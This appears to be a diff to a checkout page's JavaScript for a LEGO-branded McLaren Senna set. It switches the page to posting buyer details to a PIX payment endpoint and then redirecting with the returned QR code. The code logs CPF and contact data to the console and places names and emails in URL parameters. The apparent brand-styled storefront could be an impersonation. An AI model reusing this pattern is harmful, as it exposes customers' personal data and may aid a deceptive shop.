@@ -867,47 +867,62 @@
                 const shippingPrice = parseInt(formData.shippingPrice || 0);
                 const totalAmount = productPrice + shippingPrice;
                 
-                const orderData = {
+                const btn = document.getElementById('finalizeBtn');
+                const originalText = btn.textContent;
+                
+                // Loading state
+                btn.innerHTML = '<div class="loading-spinner mx-auto"></div>';
+                btn.disabled = true;
+
+                // Preparar dados para API PIX (seguindo padrão checkout-norte.html)
+                const paymentData = {
                     nome: formData.fullName || 'Cliente LEGO',
                     email: formData.email || '',
                     cpf: formData.cpf?.replace(/\D/g, '') || '',
-                    telefone: formData.phone?.replace(/\D/g, '') || '',
-                    valor: totalAmount / 100, // Converter para reais
-                    produto: {
-                        name: 'Icons - McLaren MP4/4 e Ayrton Senna',
-                        id: 'lego-mclaren-senna',
-                        price: productPrice / 100,
-                        image: '/lego-mclaren-senna.jpg'
-                    },
-                    entrega: {
-                        metodo: formData.shippingMethod,
-                        preco: shippingPrice / 100
-                    },
-                    utmParams: utmParams
+                    telefone: formData.phone?.replace(/\D/g, '') || ''
                 };
 
-                console.log('📤 Dados do pedido LEGO:', orderData);
-
-                // Salvar no localStorage para a página PIX
-                localStorage.setItem('orderData', JSON.stringify(orderData));
-
-                // Preparar parâmetros para a página PIX (baseado na referência norte)
-                const params = new URLSearchParams({
-                    name: orderData.nome,
-                    email: orderData.email,
-                    cpf: orderData.cpf,
-                    phone: orderData.telefone,
-                    amount: (totalAmount / 100).toString(), // Passando em reais
-                    productName: orderData.produto.name,
-                    ...utmParams
+                console.log('📤 Enviando dados para API PIX:', {
+                    valor: totalAmount,
+                    dados: paymentData
                 });
-                
-                console.log('🔄 Redirecionando para PIX LEGO...');
-                window.location.href = `pix.html?${params.toString()}`;
+
+                const response = await fetch(`${API_BASE_URL}/pagamento.php?valor=${totalAmount}`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(paymentData)
+                });
+
+                const data = await response.json();
+                console.log('📥 Resposta da API PIX:', data);
+
+                if (data.success) {
+                    const params = new URLSearchParams({
+                        token: data.token,
+                        qrcode: data.pixCopiaECola || data.pixCode,
+                        pixKey: 'lego@store.com.br',
+                        amount: (totalAmount / 100).toFixed(2), // Passando em reais
+                        name: formData.fullName || 'Cliente LEGO',
+                        email: formData.email,
+                        productName: 'Icons - McLaren MP4/4 e Ayrton Senna',
+                        ...utmParams
+                    });
+                    
+                    console.log('🔄 Redirecionando para PIX com dados processados...');
+                    window.location.href = `pix.html?${params.toString()}`;
+                } else {
+                    throw new Error(data.message || 'Erro ao gerar PIX');
+                }
 
             } catch (error) {
                 console.error('❌ Erro no checkout LEGO:', error);
-                showToast('Erro ao processar pedido: ' + error.message, 'error');
+                showToast('Erro ao processar pagamento: ' + error.message, 'error');
+            } finally {
+                const btn = document.getElementById('finalizeBtn');
+                btn.textContent = 'Finalizar compra';
+                btn.disabled = false;
             }
         }
 
